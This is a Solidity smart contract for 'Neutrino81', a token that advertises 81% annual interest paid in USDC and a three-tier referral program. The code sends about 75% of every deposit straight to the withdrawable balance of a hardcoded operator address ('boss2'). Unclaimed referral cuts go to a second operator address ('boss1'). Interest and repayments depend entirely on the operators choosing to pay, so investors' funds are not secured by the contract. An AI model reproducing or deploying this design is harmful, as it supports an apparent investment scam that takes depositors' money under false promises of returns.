['pragma solidity ^0.4.25;\n', '\n', '/*\n', '    [Rules]\n', '\n', '  [✓]  21% Referral program\n', '            9% => ref link 1 (or Boss1, if none)\n', '            7% => ref link 2 (or Boss1, if none)\n', '            5% => ref link 3 (or Boss1, if none)\n', '        \n', '  [✓]  4% => dividends for NTS81 holders from each deposit\n', '\n', '  [✓]  81% annual interest in USDC\n', '            20.25% quarterly payments \n', '            6.75% monthly payments \n', '    \n', '  [✓]   Interest periods\n', '            Q1 15-20 April 2019\n', '            Q2 15-20 July 2019\n', '            Q3 15-20 October 2019\n', '            Q4 15-20 January 2020\n', '            Q1 15-20 April 2020\n', '*/\n', '\n', '\n', 'contract Neutrino81 {\n', '    modifier onlyBagholders {\n', '        require(myTokens() > 0);\n', '        _;\n', '    }\n', '\n', '    modifier onlyStronghands {\n', '        require(myDividends(true) > 0);\n', '        _;\n', '    }\n', '    \n', '    modifier onlyAdmin {\n', '        require(msg.sender == admin);\n', '        _;\n', '    }\n', '    \n', '    modifier onlyBoss2 {\n', '        require(msg.sender == boss2);\n', '        _;\n', '    }\n', '\n', '    string public name = "Neutrino Token Standard 81";\n', '    string public symbol = "NTS81";\n', '    address public admin;\n', '    address constant internal boss1 = 0xCa27fF938C760391E76b7aDa887288caF9BF6Ada;\n', '    address constant internal boss2 = 0xf43414ABb5a05c3037910506571e4333E16a4bf4;\n', '    uint8 constant public decimals = 18;\n', '    uint8 constant internal welcomeFee_ = 25;\n', '    uint8 constant internal refLevel1_ = 9;\n', '    uint8 constant internal refLevel2_ = 7;\n', '    uint8 constant internal refLevel3_ = 5;\n', '    uint256 constant internal tokenPrice = 0.001 ether;\n', '    \n', '    uint256 constant internal magnitude = 2 ** 64;\n', '    uint256 public stakingRequirement = 0.05 ether;\n', '    mapping(address => uint256) internal tokenBalanceLedger_;\n', '    mapping(address => uint256) public referralBalance_;\n', '    mapping(address => int256) internal payoutsTo_;\n', '    mapping(address => uint256) public repayBalance_;\n', '\n', '    uint256 internal tokenSupply_;\n', '    uint256 internal profitPerShare_;\n', '    \n', '    constructor() public {\n', '        admin = msg.sender;\n', '    }\n', '\n', '    function buy(address _ref1, address _ref2, address _ref3) public payable returns (uint256) {\n', '        return purchaseTokens(msg.value, _ref1, _ref2, _ref3);\n', '    }\n', '\n', '    function() payable public {\n', '        purchaseTokens(msg.value, 0x0, 0x0, 0x0);\n', '    }\n', '\n', '    function reinvest() onlyStronghands public {\n', '        uint256 _dividends = myDividends(false);\n', '        address _customerAddress = msg.sender;\n', '        payoutsTo_[_customerAddress] +=  (int256) (_dividends * magnitude);\n', '        _dividends += referralBalance_[_customerAddress];\n', '        referralBalance_[_customerAddress] = 0;\n', '        uint256 _tokens = purchaseTokens(_dividends, 0x0, 0x0, 0x0);\n', '        emit onReinvestment(_customerAddress, _dividends, _tokens);\n', '    }\n', '\n', '    function exit() public {\n', '        address _customerAddress = msg.sender;\n', '        uint256 _tokens = tokenBalanceLedger_[_customerAddress];\n', '        if (_tokens > 0) getRepay();\n', '        withdraw();\n', '    }\n', '\n', '    function withdraw() onlyStronghands public {\n', '        address _customerAddress = msg.sender;\n', '        uint256 _dividends = myDividends(false);\n', '        payoutsTo_[_customerAddress] += (int256) (_dividends * magnitude);\n', '        _dividends += referralBalance_[_customerAddress];\n', '        referralBalance_[_customerAddress] = 0;\n', '        _customerAddress.transfer(_dividends);\n', '        emit onWithdraw(_customerAddress, _dividends, now);\n', '    }\n', '    \n', '    function getRepay() public {\n', '        address _customerAddress = msg.sender;\n', '        uint256 balance = repayBalance_[_customerAddress];\n', '        require(balance > 0);\n', '        repayBalance_[_customerAddress] = 0;\n', '        \n', '        _customerAddress.transfer(balance);\n', '        emit onGotRepay(_customerAddress, balance, now);\n', '    }\n', '\n', '    function myTokens() public view returns (uint256) {\n', '        address _customerAddress = msg.sender;\n', '        return balanceOf(_customerAddress);\n', '    }\n', '\n', '    function myDividends(bool _includeReferralBonus) public view returns (uint256) {\n', '        address _customerAddress = msg.sender;\n', '        return _includeReferralBonus ? dividendsOf(_customerAddress) + referralBalance_[_customerAddress] : dividendsOf(_customerAddress) ;\n', '    }\n', '\n', '    function balanceOf(address _customerAddress) public view returns (uint256) {\n', '        return tokenBalanceLedger_[_customerAddress];\n', '    }\n', '\n', '    function dividendsOf(address _customerAddress) public view returns (uint256) {\n', '        return (uint256) ((int256) (profitPerShare_ * tokenBalanceLedger_[_customerAddress]) - payoutsTo_[_customerAddress]) / magnitude;\n', '    }\n', '\n', '    function purchaseTokens(uint256 _incomingEthereum, address _ref1, address _ref2, address _ref3) internal returns (uint256) {\n', '        address _customerAddress = msg.sender;\n', '        \n', '        uint256[4] memory uIntValues = [\n', '            _incomingEthereum * welcomeFee_ / 100,\n', '            0,\n', '            0,\n', '            0\n', '        ];\n', '        \n', '        uIntValues[1] = uIntValues[0] * refLevel1_ / welcomeFee_;\n', '        uIntValues[2] = uIntValues[0] * refLevel2_ / welcomeFee_;\n', '        uIntValues[3] = uIntValues[0] * refLevel3_ / welcomeFee_;\n', '        \n', '        uint256 _dividends = uIntValues[0] - uIntValues[1] - uIntValues[2] - uIntValues[3];\n', '        uint256 _taxedEthereum = _incomingEthereum - uIntValues[0];\n', '        \n', '        uint256 _amountOfTokens = ethereumToTokens_(_incomingEthereum);\n', '        uint256 _fee = _dividends * magnitude;\n', '\n', '        require(_amountOfTokens > 0);\n', '\n', '        if (\n', '            _ref1 != 0x0000000000000000000000000000000000000000 &&\n', '            tokenBalanceLedger_[_ref1] * tokenPrice >= stakingRequirement\n', '        ) {\n', '            referralBalance_[_ref1] += uIntValues[1];\n', '        } else {\n', '            referralBalance_[boss1] += uIntValues[1];\n', '            _ref1 = 0x0000000000000000000000000000000000000000;\n', '        }\n', '        \n', '        if (\n', '            _ref2 != 0x0000000000000000000000000000000000000000 &&\n', '            tokenBalanceLedger_[_ref2] * tokenPrice >= stakingRequirement\n', '        ) {\n', '            referralBalance_[_ref2] += uIntValues[2];\n', '        } else {\n', '            referralBalance_[boss1] += uIntValues[2];\n', '            _ref2 = 0x0000000000000000000000000000000000000000;\n', '        }\n', '        \n', '        if (\n', '            _ref3 != 0x0000000000000000000000000000000000000000 &&\n', '            tokenBalanceLedger_[_ref3] * tokenPrice >= stakingRequirement\n', '        ) {\n', '            referralBalance_[_ref3] += uIntValues[3];\n', '        } else {\n', '            referralBalance_[boss1] += uIntValues[3];\n', '            _ref3 = 0x0000000000000000000000000000000000000000;\n', '        }\n', '\n', '        referralBalance_[boss2] += _taxedEthereum;\n', '\n', '        if (tokenSupply_ > 0) {\n', '            tokenSupply_ += _amountOfTokens;\n', '            profitPerShare_ += (_dividends * magnitude / tokenSupply_);\n', '            _fee = _fee - (_fee - (_amountOfTokens * (_dividends * magnitude / tokenSupply_)));\n', '        } else {\n', '            tokenSupply_ = _amountOfTokens;\n', '        }\n', '\n', '        tokenBalanceLedger_[_customerAddress] += _amountOfTokens;\n', '        int256 _updatedPayouts = (int256) (profitPerShare_ * _amountOfTokens - _fee);\n', '        payoutsTo_[_customerAddress] += _updatedPayouts;\n', '        \n', '        emit onTokenPurchase(_customerAddress, _incomingEthereum, _amountOfTokens, _ref1, _ref2, _ref3, now, tokenPrice);\n', '\n', '        return _amountOfTokens;\n', '    }\n', '\n', '    function ethereumToTokens_(uint256 _ethereum) public pure returns (uint256) {\n', '        uint256 _tokensReceived = _ethereum * 1e18 / tokenPrice;\n', '\n', '        return _tokensReceived;\n', '    }\n', '\n', '    function tokensToEthereum_(uint256 _tokens) public pure returns (uint256) {\n', '        uint256 _etherReceived = _tokens / tokenPrice * 1e18;\n', '\n', '        return _etherReceived;\n', '    }\n', '    \n', '    function fund() public payable {\n', '        uint256 perShare = msg.value * magnitude / tokenSupply_;\n', '        profitPerShare_ += perShare;\n', '        emit OnFunded(msg.sender, msg.value, perShare, now);\n', '    }\n', '    \n', '    /* Admin methods */\n', '    function passRepay(address customerAddress) public payable onlyBoss2 {\n', '        uint256 value = msg.value;\n', '        require(value > 0);\n', '        \n', '        repayBalance_[customerAddress] += value;\n', '        emit OnRepayPassed(customerAddress, value, now);\n', '    }\n', '\n', '    function passInterest(address customerAddress, uint256 usdRate, uint256 rate) public payable {\n', '     \n', '        require(msg.sender == admin || msg.sender == boss1 || msg.sender == boss2);\n', '        require(msg.value > 0);\n', '\n', '        referralBalance_[customerAddress] += msg.value;\n', '\n', '        emit OnInterestPassed(customerAddress, msg.value, usdRate, rate, now);\n', '    }\n', '    \n', '    event onTokenPurchase(\n', '        address indexed customerAddress,\n', '        uint256 incomingEthereum,\n', '        uint256 tokensMinted,\n', '        address ref1,\n', '        address ref2,\n', '        address ref3,\n', '        uint timestamp,\n', '        uint256 price\n', '    );\n', '\n', '    event onReinvestment(\n', '        address indexed customerAddress,\n', '        uint256 ethereumReinvested,\n', '        uint256 tokensMinted\n', '    );\n', '\n', '    event onWithdraw(\n', '        address indexed customerAddress,\n', '        uint256 value,\n', '        uint256 timestamp\n', '    );\n', '    \n', '    event onGotRepay(\n', '        address indexed customerAddress,\n', '        uint256 value,\n', '        uint256 timestamp\n', '    );\n', '    \n', '    event OnFunded(\n', '        address indexed source,\n', '        uint256 value,\n', '        uint256 perShare,\n', '        uint256 timestamp\n', '    );\n', '    \n', '    event OnRepayPassed(\n', '        address indexed customerAddress,\n', '        uint256 value,\n', '        uint256 timestamp\n', '    );\n', '\n', '    event OnInterestPassed(\n', '        address indexed customerAddress,\n', '        uint256 value,\n', '        uint256 usdRate,\n', '        uint256 rate,\n', '        uint256 timestamp\n', '    );\n', '}']